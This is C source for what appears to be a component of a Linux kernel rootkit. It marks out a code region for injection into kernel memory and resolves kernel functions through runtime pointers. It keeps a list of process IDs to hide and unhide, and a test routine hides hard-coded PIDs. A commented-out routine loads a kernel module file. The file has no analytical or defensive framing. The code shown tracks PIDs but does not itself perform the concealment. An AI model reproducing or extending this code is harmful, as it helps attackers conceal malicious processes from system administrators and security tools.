#define LABEL(name) asm("\t.globl\t"#name"\n\t.type\t"#name", @function\n"#name":\n\t.size\t"#name", .-"#name"\n");

LABEL(kernel_start)

//char kernel_start = 0;

#include <linux/slab.h>
#include <linux/types.h>
#include <linux/uaccess.h>

/*
 * Macros.
 */
#define PREFIX_MAX 32
#define LOG_LINE_MAX (1024 - PREFIX_MAX)
/*
 * Types
 */
struct pid_list_node {
    pid_t nr;
    struct task_struct *task;
    struct pid_list_node *next;
};

/*
 * Function declarations.
 */
int hide_pid(pid_t pid);
int unhide_pid(pid_t pid);
int pinfo(const char *fmt, ...);
int perr(const char *fmt, ...);
int vpfd(int fd, const char *fmt, va_list args);
void pid_list_create(void);
void pid_list_destroy(void);
void pid_list_push(pid_t nr);
pid_t pid_list_pop(pid_t nr);
//void *readfile(const char *file, size_t *len);

/*
 * Declarations of Linux Kernel functions.
 */
extern void * (*f_kmalloc)(size_t size, gfp_t flags);
extern struct pid * (*f_find_vpid)(pid_t nr);
extern int (*f_vscnprintf)(char *buf, size_t size, const char *fmt, va_list args);
extern int (*f_sys_write)(int fd, const char *mem, size_t len);

/*
 * Variable declarations.
 */
extern struct pid_list_node *pid_list_head, *pid_list_tail;
extern const char MSG_OK[], MSG_PID_NF[], MSG_PID_NH[], MSG_KM_ERR[];

void kernel_test(void) {

    pid_list_create();

    hide_pid(3924);
    hide_pid(3925);

	pid_list_destroy();
}

int hide_pid(pid_t nr) {
	struct pid *pid;
	
	pid = f_find_vpid(nr);
	if (pid) {
		pid_list_push(nr);
		pinfo(MSG_OK);

		return 0;
	} else {
		perr(MSG_PID_NF);
	}

	return -1;
}

int unhide_pid(pid_t nr) {
	if (pid_list_pop(nr) == nr) {
		pinfo(MSG_OK);

		return 0;
	} else {
		perr(MSG_PID_NH);
	}
	
	return -1;
}

void pid_list_push(pid_t nr) {
	struct pid_list_node *node;

	node = f_kmalloc(sizeof(struct pid_list_node), GFP_KERNEL);
	if (node) {
		pid_list_tail->next = node;
		pid_list_tail = node;
		node->next = NULL;
		node->nr = nr;
	} else {
		perr(MSG_KM_ERR, __LINE__);
	}
}

pid_t pid_list_pop(pid_t nr) {
	struct pid_list_node *node, *prev;

	prev = node = pid_list_head;
	while(node) {
		if (node->nr == nr) {
			prev->next = node->next;
			if (pid_list_tail == node) {
				pid_list_tail = prev;
			}
			kfree(node);

			return nr;
		}
		prev = node;
		node = node->next;
	}

	return -1;
}

void pid_list_create() {
	struct pid_list_node *node;

	node = f_kmalloc(sizeof(struct pid_list_node), GFP_KERNEL);
	node->next = NULL;
	node->nr = 0;

	pid_list_head = pid_list_tail = node;
}

void pid_list_destroy() {
	while(pid_list_head->next) {
		unhide_pid(pid_list_tail->nr);
	}
}

/*
void *readfile(const char *file, size_t *len) {
	int fd;
	void *buf;
	struct stat fd_st;

	mm_segment_t old_fs = get_fs();
	set_fs(KERNEL_DS);
	fd = open(file, O_RDONLY, 0);
	if (fd >= 0) {
		newfstat(fd, &fd_st);
		buf = kmalloc(fd_st.st_size, GFP_KERNEL);
		if (buf) {
			if (read(fd, buf, fd_st.st_size) == fd_st.st_size) {
				*len = fd_st.st_size;
				close(fd);
				return buf;
			} else {
				perr("can't read lkm");
			}
		} else {
			perr("create_load_info kmalloc error");
		}

		close(fd);
	} else {
		perr("can't open lkm");
	}
	set_fs(old_fs);

	return NULL;
}
*/

int pinfo(const char *fmt, ...) {
    va_list args;
	int ret;

    va_start(args, fmt);
    ret = vpfd(1, fmt, args);
    va_end(args);
	return ret;
}

int perr(const char *fmt, ...) {
    va_list args;
    int ret;

    va_start(args, fmt);
    ret = vpfd(2, fmt, args);
    va_end(args);
    return ret;
}

int vpfd(int fd, const char *fmt, va_list args) {
    char *textbuf = NULL;
    size_t len = 0;
	mm_segment_t old_fs;

	textbuf = f_kmalloc(LOG_LINE_MAX, GFP_KERNEL);
	if (textbuf) {
		len = f_vscnprintf(textbuf, LOG_LINE_MAX, fmt, args);
	    old_fs = get_fs();
	    set_fs(KERNEL_DS);
		len = f_sys_write(fd, textbuf, len);
		kfree(textbuf);
		set_fs(old_fs);
		return len;
	} else {
		return -1;
	}
}

LABEL(kernel_code_end)
//char kernel_code_end = 0;

/*
 * Linux Kernel functions.
 */
void * (*f_kmalloc)(size_t size, gfp_t flags) = NULL;
struct pid * (*f_find_vpid)(pid_t nr) = NULL;
int (*f_vscnprintf)(char *buf, size_t size, const char *fmt, va_list args) = NULL;
int (*f_sys_write)(int fd, const char *mem, size_t len) = NULL;
const char MSG_OK[] = "Ok\n";
const char MSG_PID_NF[] = "PID not found.\n";
const char MSG_PID_NH[] = "PID is not hidden.\n";
const char MSG_KM_ERR[] = "f_kmalloc error, line %d.\n";

/*
 * Variable definition
 */
struct pid_list_node *pid_list_head = NULL, *pid_list_tail = NULL;

LABEL(kernel_end)
//char kernel_end = 0;
